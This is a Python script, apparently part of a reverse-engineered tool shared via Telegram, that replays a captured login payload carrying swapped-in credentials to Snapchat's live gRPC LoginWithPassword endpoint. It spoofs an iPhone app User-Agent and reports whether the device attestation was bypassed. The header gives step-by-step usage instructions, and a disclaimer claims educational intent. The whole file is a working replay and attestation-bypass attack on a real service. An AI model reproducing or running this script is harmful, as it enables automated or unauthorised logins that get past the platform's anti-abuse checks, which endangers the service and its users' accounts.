import requests
import base64
import struct

# ============================================================
#   Reverse Engineered by  0xfff0800 = FaLaH
#   Telegram Channel : https://t.me/xfff0800
# ============================================================
#
#   HOW TO USE :
#
#   1. Open this file  (hex.py)
#   2. Set your username and password in the lines below :
#
#         decoded['1'] = b'USERNAME'    # Username
#         decoded['4'] = b'PASSWORD'    # Password
#
#   3. Run :  python3 hex.py
#   4. Copy the output shown after  [NEW BASE64]:
#   5. Open  login.py  and paste it inside  PAYLOAD_B64 = "..."
#   6. Run :  python3 login.py
#
# ============================================================
#
#   ⚠️  WARNING — LEGAL DISCLAIMER :
#
#   This tool is provided for EDUCATIONAL and SECURITY RESEARCH
#   purposes ONLY.
#
#   - Do NOT use this tool against accounts you do not own.
#   - Do NOT use this tool to access systems without explicit
#     written permission from the owner.
#   - Unauthorized access to computer systems is a criminal
#     offense under applicable law (CFAA, CMA, and equivalents).
#   - The author (0xfff0800 / FaLaH) holds NO responsibility
#     for any misuse, damage, or legal consequences resulting
#     from the use of this tool.
#   - By using this tool, you agree that you are solely
#     responsible for your own actions.
#
# ============================================================



# The payload captured from the device (protobuf binary encoded in base64)
PAYLOAD_B64 = "PASTE_HERE"

# decode base64 → binary protobuf
proto_bytes = base64.b64decode(PAYLOAD_B64)

# gRPC frame: [0x00][4-byte big-endian length][protobuf bytes]
grpc_body = struct.pack('>BI', 0, len(proto_bytes)) + proto_bytes

headers = {
    "Content-Type":    "application/grpc+proto",
    "User-Agent":      "Snapchat/12.85.0.44 (iPhone9,3; iOS 15.7.5; gzip)",
    "te":              "trailers",
}

print(f"[*] Sending {len(proto_bytes)} bytes protobuf ({len(grpc_body)} with gRPC frame)")

r = requests.post(
    "https://us-east1-aws.api.snapchat.com/snapchat.janus.api.LoginService/LoginWithPassword",
    headers=headers,
    data=grpc_body,
    timeout=10
)

print(f"[status] {r.status_code}")
print(f"[headers] {dict(r.headers)}")
print(f"[body hex] {r.content[:64].hex()}...")

# Interpretation of the result

if r.status_code == 200:
    print("\n[!] 200 OK - replay succeeded (potential vulnerability!)")
    print(r.text)
elif r.status_code == 401:
    print("\n[✓] 401 - attestation expired, replay blocked (expected)")
elif r.status_code == 400:
    print("\n[?] 400 - bad request format")
else:
    print(f"\n[?] Unexpected: {r.status_code}")